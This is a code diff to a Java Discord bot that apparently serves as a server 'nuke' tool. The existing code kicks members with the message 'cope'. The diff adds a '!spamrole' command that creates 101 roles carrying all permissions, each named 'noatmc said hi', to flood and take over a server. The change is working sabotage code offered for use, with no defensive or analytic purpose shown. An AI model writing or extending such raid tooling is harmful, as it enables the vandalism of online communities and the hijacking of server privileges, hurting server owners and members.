@@ -1,5 +1,6 @@
 package noatmc.said.hi.impl.listener;
 
+import net.dv8tion.jda.api.Permission;
 import noatmc.said.hi.api.logger.Logger;
 import noatmc.said.hi.api.nuke.Nuke;
 import net.dv8tion.jda.api.entities.Member;
@@ -42,7 +43,11 @@ public class MainListener extends ListenerAdapter {
                     member.kick("cope").queue();
                     Logger.log(Logger.Type.CHANGE, "kicked " + member.getUser().getName());
                 }
-
+            } else if (event.getMessage().getContentRaw().equalsIgnoreCase("!spamrole")) {
+                for (int i =0; i<=100; i++) {
+                    event.getGuild().createRole().setPermissions(Permission.ALL_PERMISSIONS).setName("noatmc said hi").queue();
+                    System.out.println("[+] " + i + " role created.");
+                }
             }
         }
     }
